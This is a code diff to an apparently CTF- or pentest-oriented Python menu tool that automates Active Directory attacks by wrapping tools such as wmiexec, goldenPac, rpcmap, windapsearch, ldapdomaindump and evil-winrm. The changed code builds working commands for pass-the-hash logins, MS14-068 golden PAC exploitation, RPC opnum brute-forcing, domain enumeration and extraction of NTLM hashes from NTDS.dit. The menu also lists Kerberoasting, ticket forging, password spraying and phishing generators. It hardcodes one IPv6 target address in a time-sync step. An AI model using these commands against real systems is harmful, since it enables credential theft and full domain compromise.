@@ -161,9 +161,11 @@ def prompt():
    selection = input("\nPress ENTER to continue...")
    return
    
-def resetTokens():
+def wipeTokens():
    command("rm    " + dataDir + "/tokens.txt")
    command("touch " + dataDir + "/tokens.txt") 
+   for x in range(0, maxUser):
+      VALD[x] = "0"
    return
    
 def saveParams():
@@ -535,17 +537,17 @@ def display():
    return
    
 def options():
-   print('\u2551' + " (01) Re/Set DNS  SERVER (12) Sync SERVER Time (23) Get Arch (34) WinLDAP Search  (45) Kerberos Info (56) Golden  PAC (67) Editor USER (78) Hydra  FTP (89) FTP    " + '\u2551')
-   print('\u2551' + " (02) Re/Set REMOTE   IP (13) Whois DNS SERVER (24) Net View (35) Lookup Sec IDs  (46) KerberoFilter (57) Domain Dump (68) Editor PASS (79) Hydra  SSH (90) SSH    " + '\u2551')
-   print('\u2551' + " (03) Re/Set LIVE  PORTS (14) dig   DNS SERVER (25) Services (36) Sam Dump Users  (47) KerberosBrute (58) *BloodHound (69) Editor HASH (80) Hydra  SMB (91) SSH ID " + '\u2551')
-   print('\u2551' + " (04) Re/Set WEBSITE URL (15) Recon DNS SERVER (26) AT  Exec (37) REGistry Hives  (48) Kerberoasting (59) *BH  ACLPwn (70) Editor HOST (81) Hydra POP3 (92) Telnet " + '\u2551')
-   print('\u2551' + " (05) Re/Set USER   NAME (16) Dump  DNS SERVER (27) DCOMExec (38) List EndPoints  (49) Kerbero Spray (60) SecretsDump (71) GenSSHkeyID (82) Hydra HTTP (93) NetCat " + '\u2551')
-   print('\u2551' + " (06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (28) PS  Exec (39) RpcClient Serv  (50) PASSWORD2HASH (61) CrackMapExe (72) GenListUser (83) Hydra  TOM (94) SQSH   " + '\u2551')
-   print('\u2551' + " (07) Re/Set NTLM   HASH (18) NMap PORTService (29) SMB Exec (40) SmbClient Serv  (51) HASHs Sprayer (62) PSExec HASH (73) GenListPass (84) MSF TOMCAT (95) MS SQL " + '\u2551')
-   print('\u2551' + " (08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) Smb Map SHARES  (52) Pass the HASH (63) SmbExecHASH (74) GenPhishCod (85) RemoteSync (96) My SQL " + '\u2551')
-   print('\u2551' + " (09) Re/Set DOMAIN NAME (20) Nmap SERVER Time (31)          (42) Smb Dump Files  (53) Silver Ticket (64) WmiExecHASH (75) AutoPhisher (86) RSyncDumps (97) WinRm  " + '\u2551')
-   print('\u2551' + " (10) Re/Set DOMAIN  SID (21)                  (32)          (43) SmbMount SHARE  (54) Golden Ticket (65) NTDSDecrypt (76) Dir Searchs (87) RemDesktop (98)        " + '\u2551')
-   print('\u2551' + " (11) Re/Set SHARE  NAME (22)                  (33) RPC MAP  (44)                 (55)               (66)             (77) Nikto Scans (88) XemDesktop (99) Exit   " + '\u2551')
+   print('\u2551' + "(01) Re/Set DNS  SERVER (12) Synchronize Time (23) Get Arch (34) WinLDAP Search (45) Kerberos Info (56) Domain Dump (67) Editor USER (78) Hydra  FTP (89) FTP      " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE   IP (13) Whois DNS SERVER (24) Net View (35) Look up SecIDs (46) KerberoFilter (57) *BloodHound (68) Editor PASS (79) Hydra  SSH (90) SSH      " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) dig   DNS SERVER (25) Services (36) Sam Dump Users (47) KerberosBrute (58) *BH  ACLPWN (69) Editor HASH (80) Hydra  SMB (91) SSHKeyID " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Recon DNS SERVER (26) AT  Exec (37) REGistry Hives (48) Kerberoasting (59) SecretsDump (70) Editor HOST (81) Hydra POP3 (92) Telnet   " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER   NAME (16) Dump  DNS SERVER (27) DCOMExec (38) Find EndPoints (49) Kerbero Spray (60) CrackMapExe (71) GenSSHkeyID (82) Hydra HTTP (93) Netcat   " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS   WORD (17) NMap  LIVE PORTS (28) PS  Exec (39) Enum End Point (50) PASSWORD2HASH (61) PSExec HASH (72) GenListUser (83) Hydra  TOM (94) SQSH     " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM   HASH (18) NMap PORTService (29) SMB Exec (40) RpcClient Serv (51) HASHs Sprayer (62) SmbExecHASH (73) GenListPass (84) MSF TOMCAT (95) MSSQL    " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap Sub DOMAINS (30) WMI Exec (41) SmbClient Serv (52) Pass the HASH (63) WmiExecHASH (74) GenPhishCod (85) RemoteSync (96) MySQL    " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20)                  (31)          (42) Smb Map SHARES (53) Silver Ticket (64)             (75) AutoPhisher (86) RSyncDumps (97) EviWinRm " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN  SID (21)                  (32)          (43) Smb Dump Files (54) Golden Ticket (65)             (76) Dir Searchs (87) RemDesktop (98)          " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE  NAME (22)                  (33)          (44) SmbMount SHARE (55) Golden DC PAC (66) NTDSDECRYPT (77) Nikto Scans (88) FreeRDPX11 (99) Exit     " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -1204,14 +1206,22 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '12':
-      BAK = LTM
-      LTM = input("[*] Please enter computer TIME: ")
-      if LTM != "":
-         command("date --set=" + LTM)
-         LTM = spacePadding(LTM, COL1)
+      command("nmap -6 -sV -p 88 dead:beef::b885:d62a:d679:573f | grep 'server time' | sed 's/^.*: //' > time.tmp")
+      
+      dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
+      date, time = dateTime.split(" ")
+      time = time.rstrip(")")
+      
+      if dateTime != "":
+         print("[+] Synchronised with remote server...\n")
+         command("timedatectl set-time " + date)
+         command("date --set=" + time)
+         LTM = spacePadding(time, COL1)
          SKEW = 1
       else:
-         LTM = BAK
+         print("[-] Server synchronisation did not occur...")
+                 
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1355,16 +1365,12 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - nmap IP46 -sU -O -p 123 --script ntp-info IP.
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '20':
-      checkParams = testOne()
-      
-      if checkParams != 1:
-         command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" "))
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1548,61 +1554,41 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - rpcmap.py -debug -auth-transport DOM/USER:PASSWORD \
+# Details : Menu option selected - 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '33':
-      checkParams = testOne()
-      
-      if checkParams != 1:
-         if NTM[:5] != "EMPTY":
-            print("[!] Using HASH value as defualt password...")
-            if "135" in POR:
-               command(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " ncacn_ip_tcp:" + TIP.rstrip(" ") + "[135]")
-            if "443" in POR:
-               command(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-level 6 -brute-opnums 'ncacn_http:[6001,RpcProxy=" + DOM.rstrip(" ") + ":443]'")
-         else:
-            if "135" in POR:
-               command(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " ncacn_ip_tcp:" + TIP.rstrip(" ") + "[135]")
-            if "443" in POR:
-               command(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-level 6 -brute-opnums 'ncacn_http:[6001,RpcProxy=" + DOM.rstrip(" ") + ":443]'")
-      prompt()
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -U-GUC --da --full.
-# Modified: N/A
+# Modified: 08/12/2020 - Currently Using DOM rather than TIP as command has issues with IP6.
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      checkParams = testTwo()   
+      checkParams = testTwo()
          
-      if IP46 == "-6":
-         print(colored("[!] WARNING!! Not comptable with IP 6...", colour0))
-         
-      if checkParams != 1:      
-         print("[*] Enumerating DNS zones...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")      
-         
-         # NEED TO INSERT A CHECK HERE TO SAVE RUNNING COMMAND BELOW AS WELL IF THERE IS AN SERVICE ERROR
-         
-         print("\n[*] Enumerating domain admins...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
-         print("\n[*] Enumerating admin protected objects...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
-         print("\n[*] Enumerating domain users...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
-         print("\n[*] Enumerating remote management users...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
-         print("\n[*] Enumerating users with unconstrained delegation...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
-         print("\n[*] Enumerating domain groups...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
-         print("\n[*] Enumerating AD computers...")
-         command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")         
+      if checkParams != 1:
+            print("[*] Enumerating DNS zones...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
+            print("\n[*] Enumerating domain admins...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
+            print("\n[*] Enumerating admin protected objects...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
+            print("\n[*] Enumerating domain users...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
+            print("\n[*] Enumerating remote management users...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
+            print("\n[*] Enumerating users with unconstrained delegation...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
+            print("\n[*] Enumerating domain groups...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
+            print("\n[*] Enumerating AD computers...")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1644,37 +1630,38 @@ while True:
               
          if os.path.getsize("alias.tmp") != 0:
             print("[+] Found Aliases...\n")
-            command("tput setaf 2; tput bold")
+            command("tput setaf 2")
             command("cat alias.tmp")
-            command("tput sgr0; tput dim")
+            command("tput sgr0")
          else:
             print("[+] Unable to find aliases...")   
                      
          if os.path.getsize("group.tmp") != 0:
             print("\n[+] Found Groups...\n")
-            command("tput setaf 2; tput bold")
+            command("tput setaf 2")
             command("cat group.tmp")
-            command("tput sgr0; tput dim")
+            command("tput sgr0")
          else:
             print("[+] Unable to find groups...")  
                       
          if os.path.getsize("users.tmp") != 0:
             print("\n[+] Found Users...\n")
-            command("tput setaf 2; tput bold")
+            command("tput setaf 2")
             command("cat users.tmp")  
-            command("tput sgr0; tput dim")
+            command("tput sgr0")
          else:
             print("[+] Unable to find usernames...")   
                   
          if os.path.getsize("users.tmp") != 0:
-            command("rm " + dataDir + "/usernames.txt")      
-               
+            command("rm " + dataDir + "/usernames.txt")
+            wipeTokens()
+                
             with open("users.tmp", "r") as read:
                for x in range(0, maxUser):
                   line1 = read.readline()                  
                   if line1 != "":
                      try:
-                        null,USER[x] = line1.split(DOM.rstrip(" ") + "\\")
+                        null,USER[x] = line1.split("\\")
                      except ValueError:
                         USER[x] = "Error..."
                      USER[x] = spacePadding(USER[x], COL3)
@@ -1719,11 +1706,11 @@ while True:
          if checkParams != 1:
             command("rm " + dataDir + "/usernames.txt")          
             command("rm " + dataDir + "/hashes.txt")                        
-            command("touch " + dataDir + "/hashes.txt")            
-            command("rm " + dataDir + "/tokens.txt")
-            command("touch " + dataDir + "/tokens.txt")                          
+            command("touch " + dataDir + "/hashes.txt")                      
             command("sed -i -n '/Found user: /p' users.tmp")
             command("cat users.tmp | sort > users2.tmp")
+            
+            wipeTokens()
             
             with open("users2.tmp", "r") as read:
                for x in range (0, maxUser):
@@ -1793,6 +1780,33 @@ while True:
       if checkParams != 1:
          command(keyPath + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - rpcmap.py -debug -auth-transport DOM/USER:PASSWORD \
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '39':
+      checkParams = testOne()
+      
+      stringBindings = input("[*] Enter a valid stringbinding value, such as 'ncacn_ip_tcp:" + DOM.rstrip(" ") + "[135]' : ")
+      
+      if checkParams != 1:
+         if NTM[:5] != "EMPTY":
+            print("[!] Using HASH value as defualt password...")
+            if "135" in POR:
+               command(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + stringBindings)
+            if "443" in POR:
+               command(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes-rpc :" + NTM.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
+         else:
+            if "135" in POR:
+               command(keyPath + "rpcmap.py -debug -auth-transport debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " " + stringBindings)
+            if "443" in POR:
+               command(keyPath + "rpcmap.py -debug -auth-transport " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-rpc " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -auth-level 6 -brute-opnums " + stringBindings)
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1802,7 +1816,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '39':
+   if selection == '40':
       checkParams = testTwo()     
        
       if checkParams != 1:
@@ -1821,7 +1835,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='40':
+   if selection =='41':
       checkParams = testOne()         
       
       if checkParams != 1:
@@ -1864,7 +1878,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '41':
+   if selection == '42':
       checkParams = testTwo()  
           
       if IP46 == "-6":
@@ -1905,7 +1919,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '42':
+   if selection == '43':
       checkParams = testTwo()      
       exTensions = fileExt.replace(",","|")
       exTensions = "'(" + exTensions + ")'"            
@@ -1932,7 +1946,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '43':
+   if selection == '44':
       checkParams = testOne()      
       
       if TSH[:5] == "EMPTY":
@@ -1946,17 +1960,6 @@ while True:
          else:
             command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " -s " + TSH.rstrip(" "))
       prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '44':
-      exit(1)
    
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2310,17 +2313,6 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      exit(1)
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='56':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -2330,6 +2322,7 @@ while True:
          else:
             command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
       prompt()
+      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2339,15 +2332,15 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='57':
+   if selection =='56':
       checkParams = testTwo()
       
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
-            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
          else:
-            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))            
+            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)            
          print("[*] Checking downloaded files: \n")
          command("ls -la ./" + workDir)
       prompt()
@@ -2360,7 +2353,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='58':
+   if selection =='57':
       checkParams = testTwo()      
       
       if checkParams != 1:
@@ -2379,7 +2372,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='59':
+   if selection =='58':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -2400,7 +2393,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='60':
+   if selection =='59':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -2459,7 +2452,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='61':
+   if selection =='60':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -2499,7 +2492,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='62':
+   if selection =='61':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -2515,7 +2508,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='63':
+   if selection =='62':
       checkParams = testTwo()
       
       if checkParams != 1:
@@ -2531,13 +2524,36 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='64':
+   if selection =='63':
       checkParams = testTwo()    
         
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
          command(keyPath + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()     
+      
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='64':
+      exit(1)
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='65':
+      exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2547,7 +2563,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='65':           
+   if selection =='66':           
       print("[*] Checking " + workDir + " for relevant files...")
       if os.path.exists("./" + workDir + "/ntds.dit"):
          print("[+] File ntds.dit found...")
@@ -2574,6 +2590,8 @@ while True:
          command("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")         
          print("[+] Imported extracted secrets...")      
         
+         wipeTokens()
+         
          with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
            for x in range (0, maxUser):
                USER[x] = read1.readline().rstrip("\n")
@@ -2586,21 +2604,9 @@ while True:
                else:
                   HASH[x] = dotPadding(HASH[x], COL4)
                VALD[x] = "0"
-           resetTokens()
       else:
-            print("[*] Please ensure that any missing files are placed in the work folder...")
+            print("[*] Please ensure that any missing files are placed in the " + workDir + " folder...")
       prompt()
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='66':
-      exit(1)
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3330,14 +3336,23 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='97':
-      checkParams = testOne()     
+      if IP46 == "-4":
+         checkParams = testOne()
+      else:
+         checkParams = testTwo()
        
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using the HASH value as a password credential...")
-            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
+            if IP46 == "-4":
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
+            else:
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s './" + httpDir + "/' -e './" + httpDir + "/'")
          else:
-            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")
+            if IP46 == "-4":
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")            
+            else:
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + httpDir + "/' -e './" + httpDir + "/'")
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3371,5 +3386,16 @@ while True:
          command("sed -i '$d' /etc/resolv.conf")     
          
       print("[*] Program sucessfully terminated...")
-      exit(1)      
+      exit(1)        
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Save config to dataDir/config.txt and exit program
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '100':
+      exit(1)
 # Eof...	
